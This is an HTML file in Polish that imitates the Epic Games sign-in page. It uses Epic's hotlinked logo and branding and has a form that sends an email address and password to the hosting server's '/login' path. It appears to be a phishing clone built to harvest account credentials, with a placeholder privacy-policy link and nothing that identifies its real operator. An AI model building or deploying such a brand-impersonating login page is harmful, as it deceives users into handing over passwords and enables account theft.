<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Epic Games - Zaloguj się lub zarejestruj</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1b1b1b;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2c2c2c;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            width: 300px;
            text-align: center;
        }
        .container img {
            width: 100px;
            margin-bottom: 20px;
        }
        .container input[type="email"],
        .container input[type="password"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #444;
            border-radius: 4px;
            background-color: #333;
            color: #fff;
        }
        .container input[type="submit"] {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 4px;
            background-color: #0078f2;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        .container input[type="submit"]:hover {
            background-color: #005bb5;
        }
        .alternative-login {
            margin-top: 20px;
        }
        .alternative-login img {
            width: 40px;
            height: 40px;
            margin: 5px;
            cursor: pointer;
        }
        .privacy-policy {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
        .privacy-policy a {
            color: #0078f2;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://cdn2.unrealengine.com/Unreal+Engine%2Feg-logo-filled-1255x1272-0eb9d144a0f981d1cbaaa1eb957de7a3207b31bb.png" alt="Epic Games">
        <form action="/login" method="POST">
            <input type="email" name="email" placeholder="Adres e-mail" required>
            <input type="password" name="password" placeholder="Hasło" required>
            <input type="submit" value="KONTYNUUJ">
        </form>

        <div class="privacy-policy">
            Logując się lub rejestrując, wyrażasz zgodę na naszą <a href="#">politykę prywatności</a>
        </div>
    </div>
</body>
</html>
